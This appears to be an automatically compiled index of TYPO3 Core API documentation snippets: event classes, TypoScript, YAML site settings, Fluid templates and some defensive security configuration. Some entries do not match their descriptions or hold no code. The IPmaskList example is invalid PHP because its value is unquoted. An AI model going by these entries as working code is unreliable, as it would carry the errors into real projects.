setLinkHandler(string $name, array $handler)\n    :returns: `$this`\n\n    Sets a handler by name, overwriting it if it already exists.\n\n    :param $name: The handler name, including trailing period.\n    :param $handler: the handler\n```\n\n----------------------------------------\n\nTITLE: Calling json_decode() Function with Named Arguments\nDESCRIPTION: This snippet shows how to call the json_decode() function using named arguments for better readability, especially useful for functions with multiple optional parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\njson_decode(\n    json: $myJsonString,\n    flags: JSON_THROW_ON_ERROR\n);\n```\n\n----------------------------------------\n\nTITLE: Content Security Policy YAML File\nDESCRIPTION: Optional configuration file for defining site-specific Content Security Policy rules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ncsp.yaml\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLinkHandlersEvent Class in TYPO3 CMS Backend Controller\nDESCRIPTION: This class definition outlines the ModifyLinkHandlersEvent, which provides methods to get, set, and modify link handlers. It includes methods for retrieving all handlers, getting a specific handler, setting a handler, and getting current link parts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkHandlersEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nphp:class:: ModifyLinkHandlersEvent\n```\n\n----------------------------------------\n\nTITLE: getByAlpha3IsoCode() Method\nDESCRIPTION: Retrieves a country object using its Alpha3 ISO code. The method accepts the Alpha3 ISO code as a string parameter and returns the associated Country object, or null if no match is found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getByAlpha3IsoCode(string $isoCode)\n        :returns: `?\\TYPO3\\CMS\\Core\\Country\\Country`\n\n        :param $isoCode: the isoCode\n```\n\n----------------------------------------\n\nTITLE: Configuring Backend Module Routes in TYPO3\nDESCRIPTION: This code demonstrates how to properly configure routes in a TYPO3 backend module, replacing a generic handler with dedicated target handlers for each controller action. This approach enables better HTTP method enforcement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/SecurityConsiderations.rst#2025-04-16_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n<?php\nuse Example\\Demo\\Controller\\CustomModuleController;\n\nreturn [\n    'demo' => [\n        'access' => 'user',\n        'path' => '/module/dashboard',\n        'iconIdentifier' => ...,  # Icon configuration here\n        'labels' => ...,          # Label configuration here\n        'routes' => [\n-             '_default' => [\n-                 'target' => CustomModuleController::class . '::handleRequest',\n-             ],\n+             '_default' => [\n+                 'target' => CustomModuleController::class . '::listAction',\n+             ],\n+             'delete' => [\n+                 'target' => CustomModuleController::class . '::deleteAction',\n+             ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: BeforeFolderMovedEvent Class Definition in TYPO3 CMS Core Resource\nDESCRIPTION: This class represents an event that is fired before a folder is moved in the TYPO3 Resource Storage. It provides methods to access the folder being moved, the target parent folder, and the target folder name, allowing event listeners to modify behavior or enforce rules during folder movement operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFolderMovedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFolderMovedEvent\n{\n    // This event is fired before a folder is about to be moved to the Resource Storage / Driver.\n    // Listeners can be used to modify a folder name before it is actually moved or to ensure consistency\n    // or specific rules when moving folders.\n    \n    public function getFolder()\n    // :returns: \\TYPO3\\CMS\\Core\\Resource\\Folder\n    \n    public function getTargetParentFolder()\n    // :returns: \\TYPO3\\CMS\\Core\\Resource\\Folder\n    \n    public function getTargetFolderName()\n    // :returns: string\n}\n```\n\n----------------------------------------\n\nTITLE: Localized Date Formatting in TYPO3 Fluid\nDESCRIPTION: Shows how to combine f:format.date with f:translate ViewHelper to provide localized date formatting. This allows for different date formats based on language settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<f:format.date date=\"{dateObject}\" format=\"{f:translate(key: 'dateFormat')}\" />\n```\n\n----------------------------------------\n\nTITLE: String Settings Configuration in YAML\nDESCRIPTION: Example showing how to define a string type site setting with label and default value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: string\n    label: 'Foo'\n    default: 'bar'\n```\n\n----------------------------------------\n\nTITLE: Extbase IgnoreValidation Annotation Example\nDESCRIPTION: This code snippet demonstrates the `IgnoreValidation` annotation in an Extbase controller action.  It prevents Extbase's default validations from being applied to a specific argument (e.g., a domain model object) passed to the action. This is useful when you want to bypass validation for a particular action.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Controller;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\nuse TYPO3Documentation\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3Documentation\\BlogExample\\Domain\\Repository\\BlogRepository;\n\n/**\n * BlogController\n */\nclass BlogController extends ActionController\n{\n\n    /**\n     * @var BlogRepository\n     */\n    protected $blogRepository = null;\n\n    /**\n     * @param BlogRepository $blogRepository\n     */\n    public function injectBlogRepository(BlogRepository $blogRepository)\n    {\n        $this->blogRepository = $blogRepository;\n    }\n\n    /**\n     * action update\n     *\n     * @param Blog $blog\n     * @return void\n     */\n    public function updateAction(Blog $blog)\n    {\n        $this->addFlashMessage('The object was updated.', '', \\TYPO3\\CMS\\Core\\Messaging\\AbstractMessage::INFO);\n        $this->blogRepository->update($blog);\n        $this->redirect('list');\n    }\n\n    /**\n     * action unrestrictedUpdate\n     *\n     * @Extbase\\IgnoreValidation(\"$blog\")\n     * @param Blog $blog\n     * @return void\n     */\n    public function unrestrictedUpdateAction(Blog $blog)\n    {\n        $this->addFlashMessage('The object was updated, validations were ignored.', '', \\TYPO3\\CMS\\Core\\Messaging\\AbstractMessage::INFO);\n        $this->blogRepository->update($blog);\n        $this->redirect('list');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Using Option Select\nDESCRIPTION: Illustrates the usage of the `options` type for extension configuration.  It shows how to define a select dropdown with labels and corresponding values. The value to the right of the equals sign (=) will be assigned to the variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\n\"# cat=basic/enable/050; type=options[label1=value1,label2=value2,value3]; label=MyLabel\\nmyVariable = value1\"\n```\n\n----------------------------------------\n\nTITLE: Disabling Registered Extension Remote in TYPO3 YAML\nDESCRIPTION: This YAML configuration shows how to disable an already registered extension remote in TYPO3. It sets the 'enabled' flag to false for the 'ter' remote, effectively disabling it.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/CustomExtensionRepository.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nextension.remote.ter:\n  tags:\n    - name: 'extension.remote'\n      enabled: false\n```\n\n----------------------------------------\n\nTITLE: Configuring RTE in TYPO3 FlexForm\nDESCRIPTION: Implementation of Rich Text Editor configuration within a FlexForm XML structure for a TYPO3 plugin.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/InTheBackend/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n..  literalinclude:: _FlexForm.xml\n    :emphasize-lines: 5\n    :caption: packages/my_extension/Configuration/FlexForms/MyPlugin.php\n```\n\n----------------------------------------\n\nTITLE: Cross-Extension Translation Example\nDESCRIPTION: Example of using translations from another extension using extensionName parameter\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<f:translate key=\"commentHeader\" extensionName=\"MyOtherExtension\" />\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for BeforeRequestTokenProcessedEvent in TYPO3\nDESCRIPTION: This example shows how to create an event listener that generates a custom request token during the authentication process. This is particularly useful when a login callback isn't available and there's no direct way to submit a request token.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/BeforeRequestTokenProcessedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Authentication\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Authentication\\Event\\BeforeRequestTokenProcessedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeRequestTokenProcessedEvent $event): void\n    {\n        if ($event->getContext() === 'fe') {\n            $challengeToken = $event->getChallengeToken();\n            if ($challengeToken && $event->getRequestToken() === null) {\n                $event->setRequestToken(\n                    hash_hmac('sha256', 'SomeValue', $challengeToken)\n                );\n            }\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Finding TYPO3 Site by Page ID\nDESCRIPTION: Method to find a site by traversing the rootline of a given page ID. Accepts optional rootLine array and mountPoint parameter for specialized lookups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Core/SiteFinder.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\ngetSiteByPageId(int $pageId, ?array $rootLine = NULL, ?string $mountPointParameter = NULL): \\TYPO3\\CMS\\Core\\Site\\Entity\\Site\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler in TypoScript\nDESCRIPTION: This TypoScript code snippet demonstrates how to configure a LinkHandler for records with a specific identifier. It sets up the link generation parameters and additional query parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.anIdentifier {\n    // Do not force link generation when the record is hidden\n    forceLink = 0\n    typolink {\n        parameter = 123\n        additionalParams.data = field:uid\n        additionalParams.wrap = &tx_example_pi1[item]=|&tx_example_pi1[controller]=Item&tx_example_pi1[action]=show\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP GitHub Link Handling\nDESCRIPTION: Core link handler implementation for handling GitHub link format.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n    public function asString(array $parameters): string\n    {\n        if (!isset($parameters['issue'])) {\n            throw new \\InvalidArgumentException(\n                'Issue parameter must be set.',\n                1686728019\n            );\n        }\n        return sprintf('t3://github?issue=%s', $parameters['issue']);\n    }\n\n    public function resolveHandlerData(array $data): array\n    {\n        return [\n            'issue' => $data['issue'] ?? '',\n        ];\n    }\n```\n\n----------------------------------------\n\nTITLE: Configuring Backend Log Error Reporting in TYPO3\nDESCRIPTION: Sets which PHP errors should be logged to the 'syslog' database table. The default excludes E_STRICT and E_NOTICE errors from being logged.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nE_ALL & ~(E_STRICT | E_NOTICE)\n```\n\n----------------------------------------\n\nTITLE: Retrieving TYPO3 Version Information with Typo3Version Class in PHP\nDESCRIPTION: This snippet shows the methods available in the Typo3Version class for accessing version information of the current TYPO3 installation. It includes methods to get the full version, branch, major version number, and a string representation of the version.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Typo3Information/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Information\\Typo3Version::getVersion()\nTYPO3\\CMS\\Core\\Information\\Typo3Version::getBranch()\nTYPO3\\CMS\\Core\\Information\\Typo3Version::getMajorVersion()\nTYPO3\\CMS\\Core\\Information\\Typo3Version::__toString()\n```\n\n----------------------------------------\n\nTITLE: Default File Permissions Configuration in TYPO3 TSconfig\nDESCRIPTION: Default read-only permission configuration for backend users and user groups. Sets basic file and folder operation permissions like add, read, write, copy, move, rename, and delete.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Administration/Permissions.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npermissions.file.default {\n  addFile      = 0\n  readFile     = 1\n  writeFile    = 0\n  copyFile     = 0\n  moveFile     = 0\n  renameFile   = 0\n  deleteFile   = 0\n  addFolder    = 0\n  readFolder   = 1\n  writeFolder  = 0\n  copyFolder   = 0\n  moveFolder   = 0\n  renameFolder = 0\n  deleteFolder = 0\n  recursivedeleteFolder = 0\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Magallanes YAML Configuration\nDESCRIPTION: Example configuration file for Magallanes deployment tool showing its basic structure and settings. The file is typically named .mage.yml and contains deployment environment configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Deployment/Magallanes/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n_mage.yml\n```\n\n----------------------------------------\n\nTITLE: Implementing a BeforeRecordLanguageOverlayEvent Listener in TYPO3\nDESCRIPTION: This example demonstrates how to create an event listener that changes the overlay type to \"on\" (connected) for records. This approach helps when dealing with a site configured with free mode, but having record types with connected languages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/BeforeRecordLanguageOverlayEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Language;\n\nuse TYPO3\\CMS\\Core\\Context\\LanguageAspect;\nuse TYPO3\\CMS\\Core\\Domain\\Event\\BeforeRecordLanguageOverlayEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeRecordLanguageOverlayEvent $event): void\n    {\n        $tableName = $event->getTableName();\n        $record = $event->getRecord();\n        $languageAspect = $event->getLanguageAspect();\n\n        if ($tableName === 'tt_content' && $record['CType'] === 'myCoolExtension_mytype') {\n            // Set overlay mode to \"on\" (connected) for all languages for this CType\n            $event->setLanguageAspect(\n                new LanguageAspect(\n                    $languageAspect->getId(),\n                    $languageAspect->getContentId(),\n                    0 // overlayType = 0 means \"connected\"/\"on\"\n                )\n            );\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Lowlevel Extension\nDESCRIPTION: Command to install the lowlevel system extension via Composer, which provides the Configuration module needed for TCA verification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/Verifying/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncomposer req typo3/cms-lowlevel\n```\n\n----------------------------------------\n\nTITLE: Configuring PHP Handling in .htaccess\nDESCRIPTION: This code snippet configures how PHP files should be handled in an `.htaccess` file using `<FilesMatch>` and `SetHandler`. It ensures that only files ending with `.php` are processed as PHP scripts, preventing execution of files with `.php` in the middle of the extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FileExtensionHandling.rst#2025-04-16_snippet_3\n\nLANGUAGE: apacheconf\nCODE:\n```\n<FilesMatch \".+\\\\.php$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n----------------------------------------\n\nTITLE: Defining SwitchUserEvent Class in TYPO3 CMS Backend Authentication\nDESCRIPTION: This code snippet defines the SwitchUserEvent class in the TYPO3\\CMS\\Backend\\Authentication\\Event namespace. The class is triggered when a 'Switch User' action occurs and provides methods to retrieve session and user information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/SwitchUserEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Authentication\\Event;\n\nclass SwitchUserEvent\n{\n    public function getSessionId(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getTargetUser(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getCurrentUser(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing TYPO3 Cache Warmup Command\nDESCRIPTION: Command line syntax for warming up TYPO3 caches. Accepts an optional group parameter to specify which cache groups to warm up. Default behavior warms up all available cache groups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncache:warmup [--group <all|system|di|pages|...>]\n```\n\n----------------------------------------\n\nTITLE: Default Typolink Builder Configuration in TYPO3\nDESCRIPTION: Default configuration array for typolink builder implementations that handle different types of links in TYPO3 frontend. Maps link types to their respective builder classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/FE.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n[\n    'page' => \\TYPO3\\CMS\\Frontend\\Typolink\\PageLinkBuilder::class,\n    'file' => \\TYPO3\\CMS\\Frontend\\Typolink\\FileOrFolderLinkBuilder::class,\n    'folder' => \\TYPO3\\CMS\\Frontend\\Typolink\\FileOrFolderLinkBuilder::class,\n    'url' => \\TYPO3\\CMS\\Frontend\\Typolink\\ExternalUrlLinkBuilder::class,\n    'email' => \\TYPO3\\CMS\\Frontend\\Typolink\\EmailLinkBuilder::class,\n    'record' => \\TYPO3\\CMS\\Frontend\\Typolink\\DatabaseRecordLinkBuilder::class,\n    'telephone' => \\TYPO3\\CMS\\Frontend\\Typolink\\TelephoneLinkBuilder::class,\n    'unknown' => \\TYPO3\\CMS\\Frontend\\Typolink\\LegacyLinkBuilder::class,\n]\n```\n\n----------------------------------------\n\nTITLE: Implementing JavaScript for Custom Field Control in TYPO3\nDESCRIPTION: This JavaScript code defines the behavior for the custom field control in TYPO3. It sets up an event listener for the import button and sends an Ajax request to import data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\ndefine(['jquery', 'TYPO3/CMS/Backend/Notification'],\n    function ($, Notification) {\n        'use strict';\n\n        $(document).on('click', '.importData', function (evt) {\n            evt.preventDefault();\n            var $anchorElement = $(this);\n            var id = $anchorElement.data('id');\n\n            $.ajax({\n                url: TYPO3.settings.ajaxUrls['record_import'],\n                data: {\n                    id: id\n                }\n            }).done(function (response) {\n                if (response.success) {\n                    Notification.success('Success', 'Data imported');\n                } else {\n                    Notification.error('Error', 'Could not import data');\n                }\n            });\n        });\n    }\n);\n```\n\n----------------------------------------\n\nTITLE: Including Context Menu JavaScript in Fluid Layout\nDESCRIPTION: Example of how to include the necessary JavaScript for context menus in a Fluid layout file using the includeJavaScriptModules property of the backend container view helper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<f:be.container\n    includeJavaScriptModules=\"\n        TYPO3/CMS/Backend/ContextMenu\n    \"\n>\n```\n\n----------------------------------------\n\nTITLE: TYPO3 XLF Label Path Example\nDESCRIPTION: Demonstrates the format of an XLF label path reference used to locate translation files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/_LanguageService.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:labels.depth_0'\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Correct Vendor Naming Conventions\nDESCRIPTION: Shows the correct format for vendor names in TYPO3 extensions, emphasizing that vendor names must be a single segment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// correct vendor name for 'web company':\n\\WebCompany\n\n// wrong vendor name for 'web company':\n\\Web\\Company\n```\n\n----------------------------------------\n\nTITLE: Configuring reStructuredText Document for TYPO3 Frontend Events\nDESCRIPTION: Sets up the document structure, including directives for file inclusion, indexing, and creating a table of contents for frontend-related PSR-14 events in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Frontend\n..  _eventlist-frontend:\n\n\n========\nFrontend\n========\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin the TYPO3 Core .\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Implementing getActionGroup Method in PHP\nDESCRIPTION: This method retrieves the actions of a specific group.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getActionGroup(string $group): ?array\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring IPmaskList for Backend Access - PHP\nDESCRIPTION: This snippet sets up the allowed IP addresses for accessing the TYPO3 backend. It utilizes a string of comma-separated values, where wildcards can also be included to specify a network, enhancing security governance by restricting access based on known IP addresses.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/GlobalTypo3Options.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['IPmaskList'] = 123.45.67.89,192.168.*.*\n```\n\n----------------------------------------\n\nTITLE: Selecting Image Processing Software\nDESCRIPTION: This snippet allows the selection between ImageMagick and GraphicsMagick for processing images in TYPO3, enabling developers to choose the tool based on their server's capabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['processor'] = 'ImageMagick';\n```\n\n----------------------------------------\n\nTITLE: TypoScript Configuration for Fluid Templates\nDESCRIPTION: Shows how to set up Fluid template paths using TypoScript with the PAGEVIEW object in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\npage.10 = PAGEVIEW\npage.10 {\n    templateRootPaths {\n        0 = EXT:my_sitepackage/Resources/Private/PageView/Pages/\n    }\n    partialRootPaths {\n        0 = EXT:my_sitepackage/Resources/Private/PageView/Partials/\n    }\n    layoutRootPaths {\n        0 = EXT:my_sitepackage/Resources/Private/PageView/Layouts/\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring reST Image with MFA Screenshot\nDESCRIPTION: reST directive for displaying a screenshot of the MFA provider management interface in TYPO3 CMS, including path configuration and styling classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Authentication/MfaActivate.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Authentication/MfaActivate.png\n   :class: with-shadow\n\n   Manage your MFA providers in the User Settings module\n```\n\n----------------------------------------\n\nTITLE: Defining Page Types with PAGES_TYPES in TYPO3\nDESCRIPTION: The PAGES_TYPES array defines different page types (`doktype`) and their associated restrictions, allowing the specification of permissible tables per page type. The default configuration applies unless overridden.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_5\n\n\n\n----------------------------------------\n\nTITLE: Combined Field and Current TypoScript Configuration\nDESCRIPTION: Demonstrates combining field and current approaches in TypoScript for maximum flexibility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_9\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.myCounter = COA\nlib.myCounter {\n  10 = TEXT\n  10.field = title\n  20 = TEXT\n  20.current = 1\n  wrap = (<strong>|</strong>)\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for TYPO3 Redirect URL Collection Event\nDESCRIPTION: Defines a class that handles events after page URLs have been collected for site redirect integrity checks. The class provides methods to get the site object, set page URLs, and retrieve page URLs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/AfterPageUrlsForSiteForRedirectIntegrityHaveBeenCollectedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Redirects\\Event;\n\nclass AfterPageUrlsForSiteForRedirectIntegrityHaveBeenCollectedEvent\n{\n    public function getSite(): \\TYPO3\\CMS\\Core\\Site\\Entity\\Site\n    {\n        // Returns the site object\n    }\n\n    public function setPageUrls(array $pageUrls): void\n    {\n        // Sets the page URLs\n    }\n\n    public function getPageUrls(): array\n    {\n        // Returns the page URLs\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 TypoScript Context-Based Styling\nDESCRIPTION: Demonstrates using application context conditions in TypoScript to apply specific styling based on the development environment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: typoscript\nCODE:\n```\n[applicationContext == \"Development/Dev1\"]\npage.10.wrap = <div style=\"border: 3px red solid;\">|</div>\n[END]\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Redirects Event Class Definition\nDESCRIPTION: Class definition for ModifyRedirectManagementControllerViewDataEvent with methods for managing redirect view data, including demand objects, redirects, hosts, status codes, and other view-related functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/ModifyRedirectManagementControllerViewDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Redirects\\Event;\n\nclass ModifyRedirectManagementControllerViewDataEvent {\n    public function getDemand(): \\TYPO3\\CMS\\Redirects\\Repository\\Demand;\n    public function setDemand(\\TYPO3\\CMS\\Redirects\\Repository\\Demand $demand): void;\n    public function getRedirects(): array;\n    public function setRedirects(array $redirects): void;\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getHosts(): array;\n    public function setHosts(array $hosts): void;\n    public function getStatusCodes(): array;\n    public function setStatusCodes(array $statusCodes): void;\n    public function getCreationTypes(): array;\n    public function setCreationTypes(array $creationTypes): void;\n    public function getShowHitCounter(): bool;\n    public function setShowHitCounter(bool $showHitCounter): void;\n    public function getView(): \\TYPO3\\CMS\\Core\\View\\ViewInterface;\n    public function setView(\\TYPO3\\CMS\\Core\\View\\ViewInterface $view): void;\n    public function getIntegrityStatusCodes(): array;\n    public function 